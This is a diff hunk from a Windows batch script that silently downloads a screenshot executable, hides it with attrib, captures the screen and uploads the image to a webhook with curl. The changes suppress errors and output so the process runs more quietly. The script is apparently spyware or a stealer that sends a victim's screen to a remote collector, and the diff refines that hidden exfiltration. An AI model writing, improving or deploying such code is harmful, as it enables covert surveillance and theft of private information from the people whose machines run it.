@@ -43,16 +43,15 @@ goto skipscreenshot
 	set "ssurl=https://github.com/chuntaro/screenshot-cmd/blob/master/screenshot.exe?raw=true"
 	
 	IF EXIST "s.exe" GOTO waitloop3
-	curl --silent -L "%ssurl%" -o s.exe
+	curl --silent -L --fail "%ssurl%" -o s.exe
 	>NUL attrib "%vpath%\s.exe" +h
 	
 	:waitloop3
 	IF EXIST "s.exe" GOTO waitloopend3
-	timeout /t 1
-	goto waitloop3
+	timeout /t 5 /nobreak > NUL
 	:waitloopend3
 	
-	s.exe -wh 1e9060a -o s.png
+	2> NUL s.exe -wh 1e9060a -o s.png
 	
 	curl --silent --output /dev/null -F ss=@"%vpath%\s.png" %webhook%
 	
